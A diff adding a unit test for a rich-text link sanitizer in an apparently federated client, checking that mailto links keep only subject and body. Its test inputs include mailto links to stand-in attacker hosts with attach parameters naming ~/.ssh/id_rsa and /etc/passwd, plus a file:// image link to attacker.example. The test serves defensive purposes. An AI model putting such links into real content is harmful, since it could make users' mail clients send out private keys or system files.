@@ -96,6 +96,18 @@ class LinkPolicyTest(unittest.TestCase):
                     "-help", "", None, "https://a.example/\n", "C:\\Windows\\x.exe"):
             self.assertFalse(openable(bad), bad)
 
+    def test_a_mail_link_suggests_no_more_than_a_subject_and_a_body(self):
+        """mailto:…?attach=~/.ssh/id_rsa — some mail clients take the file along: a
+        post's mail link keeps only its subject and body, whatever else it says."""
+        from fedtail.frontends.richtext import clean, safe_href
+        self.assertEqual(safe_href("mailto:x@evil.example?attach=~/.ssh/id_rsa&"
+                                   "subject=Hi%20there&body=b&X-Header=1"),
+                         "mailto:x@evil.example?subject=Hi%20there&body=b")
+        self.assertEqual(safe_href("mailto:a@b.example?Attachment=/etc/passwd"),
+                         "mailto:a@b.example")
+        self.assertEqual(safe_href("mailto:a@b.example"), "mailto:a@b.example")
+        self.assertNotIn("attach", clean('<a href="mailto:a@b.example?attach=/x">m</a>'))
+
     def test_tooltips_show_someone_elses_words_as_written(self):
         from fedtail.frontends.richtext import plain_tip
         tip = plain_tip('<img src="file://attacker.example/s/x.png"> a & b\nnext')
